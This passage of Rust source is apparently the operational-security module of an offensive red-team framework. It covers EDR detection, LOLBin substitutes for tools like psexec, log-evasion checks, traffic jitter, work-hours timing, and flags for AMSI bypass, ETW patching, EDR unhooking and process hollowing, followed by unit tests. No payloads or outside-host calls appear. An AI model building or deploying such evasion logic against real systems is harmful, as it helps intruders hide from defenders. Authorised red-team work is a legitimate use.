        self.traffic_shaper = DefaultTrafficShaper::new(config.clone());
        self.user_simulator = UserSimulator::new(config.clone());
        self.log_evasion = LogEvasion::new(config);
    }

    /// Sleep with OPSEC jitter
    pub async fn sleep(&self) {
        self.traffic_shaper.sleep_with_jitter().await;
    }

    /// Throttle network packets
    pub async fn throttle(&self, packets: usize) -> usize {
        self.traffic_shaper.throttle(packets).await
    }

    /// Get detected EDRs
    pub fn detected_edrs(&self) -> &[EdrType] {
        &self.detected_edrs
    }

    /// Detect EDR on target
    pub async fn detect_edr(&mut self, safe_mode: bool) -> Result<EdrDetectionResult> {
        let result = self.edr_detector.detect(safe_mode).await?;
        self.detected_edrs = result.detected_edrs.clone();

        // Auto-adapt configuration
        if self.config.edr_aware {
            self.config = result.recommended_config.clone();
            info!("OPSEC adapted to detected EDR: {:?}", self.config.stealth_level);
        }

        Ok(result)
    }

    /// Get LOLBin alternative for a dangerous tool
    pub fn get_lolbin(&self, dangerous_tool: &str) -> Option<&LolbinMapping> {
        self.lolbin_executor.get_alternative(dangerous_tool)
    }

    /// List all LOLBin mappings
    pub fn list_lolbins(&self) -> &[LolbinMapping] {
        self.lolbin_executor.list_mappings()
    }

    /// Check if action is monitored
    pub fn is_monitored(&self, action: MonitoredAction) -> bool {
        self.log_evasion.is_monitored(action)
    }

    /// Simulate user behavior
    pub async fn simulate_user(&self) {
        if self.config.simulate_user {
            self.user_simulator.pause_between_actions().await;
        }
    }

    /// Wait for work hours if configured
    pub async fn wait_for_work_hours(&self) {
        self.user_simulator.wait_for_work_hours().await;
    }

    /// Pre-operation OPSEC checks
    pub async fn pre_operation(&self, action: MonitoredAction) -> OpsecDecision {
        // Check work hours
        if self.config.work_hours_only && !self.user_simulator.is_work_hours() {
            return OpsecDecision::Wait("Outside work hours".to_string());
        }

        // Check if action is too risky
        if self.is_monitored(action) {
            if self.config.use_lolbins_only {
                return OpsecDecision::UseAlternative(
                    action.evasion_technique().to_string(),
                );
            } else {
                warn!(
                    "High-risk action {:?} - consider using alternative",
                    action
                );
            }
        }

        // Add delay
        if self.config.simulate_user {
            let delay = self.user_simulator.random_delay().await;
            return OpsecDecision::Proceed(Some(delay));
        }

        OpsecDecision::Proceed(None)
    }

    /// Post-operation OPSEC (add delay)
    pub async fn post_operation(&self) {
        self.sleep().await;
    }

    /// Generate OPSEC report
    pub fn generate_report(&self) -> OpsecReport {
        OpsecReport {
            stealth_level: self.config.stealth_level,
            detected_edrs: self.detected_edrs.clone(),
            sleep_duration: self.config.sleep,
            jitter: self.config.jitter,
            lolbins_only: self.config.use_lolbins_only,
            memory_only: self.config.memory_only,
            traffic_encrypted: self.config.encrypt_traffic,
            user_simulation: self.config.simulate_user,
            work_hours_only: self.config.work_hours_only,
            edr_aware: self.config.edr_aware,
            features_enabled: self.get_enabled_features(),
        }
    }

    fn get_enabled_features(&self) -> Vec<String> {
        let mut features = Vec::new();

        if self.config.use_lolbins_only {
            features.push("LOLBins Only".to_string());
        }
        if self.config.memory_only {
            features.push("Memory-Only Execution".to_string());
        }
        if self.config.encrypt_traffic {
            features.push("Traffic Encryption".to_string());
        }
        if self.config.disguise_traffic {
            features.push("Traffic Disguise".to_string());
        }
        if self.config.simulate_user {
            features.push("User Simulation".to_string());
        }
        if self.config.work_hours_only {
            features.push("Work Hours Only".to_string());
        }
        if self.config.edr_aware {
            features.push("EDR Awareness".to_string());
        }
        if self.config.process_hollowing {
            features.push("Process Hollowing".to_string());
        }
        if self.config.ppid_spoofing {
            features.push("PPID Spoofing".to_string());
        }
        if self.config.unhook_edr {
            features.push("EDR Unhooking".to_string());
        }
        if self.config.amsi_bypass {
            features.push("AMSI Bypass".to_string());
        }
        if self.config.etw_patch {
            features.push("ETW Patching".to_string());
        }

        features
    }
}

/// OPSEC decision for an operation
#[derive(Debug, Clone)]
pub enum OpsecDecision {
    /// Proceed with operation (optional delay)
    Proceed(Option<Duration>),
    /// Wait before proceeding
    Wait(String),
    /// Use alternative technique
    UseAlternative(String),
    /// Abort operation
    Abort(String),
}

/// OPSEC status report
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpsecReport {
    pub stealth_level: StealthLevel,
    pub detected_edrs: Vec<EdrType>,
    pub sleep_duration: Duration,
    pub jitter: f32,
    pub lolbins_only: bool,
    pub memory_only: bool,
    pub traffic_encrypted: bool,
    pub user_simulation: bool,
    pub work_hours_only: bool,
    pub edr_aware: bool,
    pub features_enabled: Vec<String>,
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stealth_levels() {
        assert!(StealthLevel::Ghost > StealthLevel::Silent);
        assert!(StealthLevel::Silent > StealthLevel::Quiet);
        assert!(StealthLevel::Quiet > StealthLevel::Normal);
    }

    #[test]
    fn test_opsec_config_creation() {
        let ghost = OpsecConfig::ghost();
        assert_eq!(ghost.stealth_level, StealthLevel::Ghost);
        assert!(ghost.use_lolbins_only);
        assert!(ghost.memory_only);

        let normal = OpsecConfig::normal();
        assert_eq!(normal.stealth_level, StealthLevel::Normal);
        assert!(!normal.use_lolbins_only);
    }

    #[test]
    fn test_edr_detection() {
        let detector = EdrDetector::new();

        let processes = vec![
            "MsMpEng.exe".to_string(),
            "chrome.exe".to_string(),
        ];

        let detected = detector.detect_from_processes(&processes);
        assert!(detected.contains(&EdrType::WindowsDefender));
    }

    #[test]
    fn test_edr_recommendation() {
        let detector = EdrDetector::new();

        let edrs = vec![EdrType::CrowdStrike];
        let config = detector.recommend_config(&edrs);
        assert_eq!(config.stealth_level, StealthLevel::Ghost);

        let edrs = vec![EdrType::WindowsDefender];
        let config = detector.recommend_config(&edrs);
        assert_eq!(config.stealth_level, StealthLevel::Silent);
    }

    #[test]
    fn test_lolbin_executor() {
        let executor = LolbinExecutor::new(Platform::Windows);

        let alt = executor.get_alternative("psexec.exe");
        assert!(alt.is_some());

        let alternatives = executor.get_all_alternatives("psexec.exe");
        assert!(alternatives.len() >= 3);
    }

    #[test]
    fn test_monitored_actions() {
        let evasion = LogEvasion::new(OpsecConfig::ghost());

        assert!(evasion.is_monitored(MonitoredAction::CredentialAccess));
        assert!(evasion.is_monitored(MonitoredAction::PowerShellExecution));
    }

    #[test]
    fn test_traffic_throttle() {
        let config = OpsecConfig::ghost();
        assert_eq!(config.max_network_noise.max_packets(), 3);

        let config = OpsecConfig::normal();
        assert_eq!(config.max_network_noise.max_packets(), 1000);
    }

    #[tokio::test]
    async fn test_opsec_engine() {
        let engine = OpsecEngine::new(OpsecConfig::quiet(), Platform::Windows);

        let report = engine.generate_report();
        assert_eq!(report.stealth_level, StealthLevel::Quiet);
    }
}
